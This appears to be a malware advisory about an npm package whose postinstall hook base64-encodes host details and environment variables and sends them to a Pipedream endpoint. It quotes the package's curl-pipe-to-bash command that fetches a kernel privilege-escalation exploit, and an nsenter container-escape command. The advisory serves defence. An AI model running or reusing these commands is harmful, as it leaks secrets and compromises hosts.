summary: postinstall exfiltrates host/env to Pipedream and executes remote shell script
details: package.json declares a postinstall that runs an inline Node script performing multiple installer-side attacks. (1) It collects os.platform(), os.arch(), os.hostname(), the OS username (whoami), and enumerates every key of process.env (values truncated to 20 chars), base64-encodes the JSON, and issues https.get to http://eodxy50gl486xrx.m.pipedream.net/ — a Pipedream request-capture endpoint under attacker control. (2) On Linux it runs `curl -s https://raw.githubusercontent.com/Akabe1/akabe1.github.io/master/_posts/exploits/cve-2021-22555/exploit.sh | bash`, fetching and executing an unpinned remote shell script from an unrelated user's GitHub Pages, framed as a Linux kernel local-privilege-escalation exploit (CVE-2021-22555). (3) It invokes `nsenter --mount=/proc/1/ns/mnt -- /bin/sh -c...` to break out of a container into the host mount namespace, and on Windows attempts `docker exec` into a running container; results are shipped to the same capture endpoint. All of this fires automatically on `npm install` via the postinstall lifecycle hook.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
